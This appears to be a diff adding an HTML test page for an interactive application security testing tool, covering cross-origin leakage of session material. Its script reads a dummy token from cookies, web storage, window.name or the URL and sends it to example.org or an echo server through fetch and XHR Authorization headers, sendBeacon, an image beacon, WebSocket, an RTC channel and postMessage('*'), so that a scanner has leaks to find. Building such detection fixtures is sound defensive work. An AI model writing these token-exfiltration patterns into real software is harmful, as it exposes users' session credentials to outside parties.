@@ -1,0 +1,79 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>IAST Session Material Cross Boundary</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    body { font-family: system-ui, -apple-system, sans-serif; margin: 0; padding: 24px; background: #0f172a; color: #e2e8f0; }
+    .card { background: #111827; border: 1px solid #1f2937; border-radius: 12px; padding: 16px; margin-bottom: 16px; }
+    label { display: block; margin: 8px 0 4px; color: #cbd5e1; }
+    input, textarea, button, select { width: 100%; border-radius: 10px; border: 1px solid #1f2937; padding: 10px; background: #0b1220; color: #e2e8f0; }
+    textarea { min-height: 80px; }
+    button { margin-top: 8px; cursor: pointer; font-weight: 600; background: #2563eb; border: none; }
+    .note { color: #94a3b8; font-size: 0.9rem; }
+    .back-link { display:inline-block; margin-bottom:12px; color:#93c5fd; text-decoration:none; font-weight:600; }
+  </style>
+</head>
+<body>
+  <a class="back-link" href="index.html">← Back to index</a>
+  <h1>IAST Session Material Cross-Boundary</h1>
+  <p class="note">Covers cross-origin reuse of session-like material through headers, beacons, WebSocket/WebRTC, and postMessage.</p>
+  <div class="card">
+    <label for="sessionValue">Session material</label>
+    <input id="sessionValue" type="text" value="Bearer ptk-session-token">
+    <label for="sourceType">Source</label>
+    <select id="sourceType">
+      <option value="cookie">cookie</option>
+      <option value="localStorage">localStorage</option>
+      <option value="sessionStorage">sessionStorage</option>
+      <option value="windowName">window.name</option>
+      <option value="referrer">referrer (open via helper)</option>
+    </select>
+    <label for="crossUrl">Cross-origin URL</label>
+    <input id="crossUrl" type="text" value="https://example.org/session-cross-boundary">
+    <button id="prime">Prime session source</button>
+    <p id="status" class="note">No source primed yet.</p>
+  </div>
+  <div class="card">
+    <button id="btn-fetch-header">fetch headers</button>
+    <button id="btn-xhr-header">XHR header</button>
+    <button id="btn-beacon">sendBeacon</button>
+    <button id="btn-image">image beacon</button>
+    <button id="btn-ws">WebSocket.send</button>
+    <button id="btn-rtc">RTCDataChannel.send</button>
+    <button id="btn-post-star">postMessage('*')</button>
+    <button id="btn-post-cross">postMessage(crossOrigin)</button>
+  </div>
+  <script>
+    const sessionField = document.getElementById('sessionValue');
+    const crossUrlField = document.getElementById('crossUrl');
+    const status = document.getElementById('status');
+    function currentSession() {
+      const selected = document.getElementById('sourceType').value;
+      if (selected === 'cookie') { const m = document.cookie.match(/(?:^|; )iast_payload=([^;]+)/); return m ? decodeURIComponent(m[1]) : sessionField.value; }
+      if (selected === 'localStorage') return localStorage.getItem('iast_payload') || sessionField.value;
+      if (selected === 'sessionStorage') return sessionStorage.getItem('iast_payload') || sessionField.value;
+      if (selected === 'windowName') return window.name || sessionField.value;
+      return new URLSearchParams(location.search).get('payload') || sessionField.value;
+    }
+    document.getElementById('prime').onclick = () => {
+      const payload = sessionField.value;
+      const selected = document.getElementById('sourceType').value;
+      if (selected === 'cookie') document.cookie = 'iast_payload=' + encodeURIComponent(payload) + '; path=/';
+      if (selected === 'localStorage') localStorage.setItem('iast_payload', payload);
+      if (selected === 'sessionStorage') sessionStorage.setItem('iast_payload', payload);
+      if (selected === 'windowName') window.name = payload;
+      status.textContent = 'Primed source: ' + selected;
+    };
+    document.getElementById('btn-fetch-header').onclick = () => fetch(crossUrlField.value, { headers: { Authorization: currentSession() } }).catch(() => {});
+    document.getElementById('btn-xhr-header').onclick = () => { const xhr = new XMLHttpRequest(); xhr.open('GET', crossUrlField.value); xhr.setRequestHeader('Authorization', currentSession()); xhr.send(); };
+    document.getElementById('btn-beacon').onclick = () => navigator.sendBeacon(crossUrlField.value, currentSession());
+    document.getElementById('btn-image').onclick = () => { const img = new Image(); img.src = crossUrlField.value + '?token=' + encodeURIComponent(currentSession()); };
+    document.getElementById('btn-ws').onclick = () => { try { const ws = new WebSocket('wss://echo.websocket.events'); ws.addEventListener('open', () => ws.send(currentSession())); setTimeout(() => { try { ws.close(); } catch (_) {} }, 1000); } catch (_) {} };
+    document.getElementById('btn-rtc').onclick = async () => { if (typeof RTCPeerConnection === 'undefined') return; const a = new RTCPeerConnection(); const b = new RTCPeerConnection(); a.onicecandidate = e => e.candidate && b.addIceCandidate(e.candidate).catch(() => {}); b.onicecandidate = e => e.candidate && a.addIceCandidate(e.candidate).catch(() => {}); b.ondatachannel = e => { e.channel.onmessage = () => {}; }; const ch = a.createDataChannel('ptk'); ch.onopen = () => ch.send(currentSession()); const offer = await a.createOffer(); await a.setLocalDescription(offer); await b.setRemoteDescription(offer); const ans = await b.createAnswer(); await b.setLocalDescription(ans); await a.setRemoteDescription(ans); };
+    document.getElementById('btn-post-star').onclick = () => window.postMessage(currentSession(), '*');
+    document.getElementById('btn-post-cross').onclick = () => window.postMessage(currentSession(), 'https://example.org');
+  </script>
+</body>
+</html>
